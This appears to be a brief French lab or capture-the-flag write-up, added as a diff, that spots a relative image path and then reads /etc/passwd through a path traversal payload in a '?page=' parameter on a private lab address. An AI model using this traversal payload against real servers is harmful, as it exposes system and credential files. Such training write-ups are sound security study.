@@ -1,0 +1,8 @@
+On peux voir qu'une image est chargé de cette facon: background-image: "../images/banner.jpg"
+ce qui peux nous alerter sur l'exploit transversal path
+
+testons le fameux: ../../../../../../../../../etc/passwd
+
+http://192.168.99.102/?page=../../../../../../../../../etc/passwd
+
+bingo !
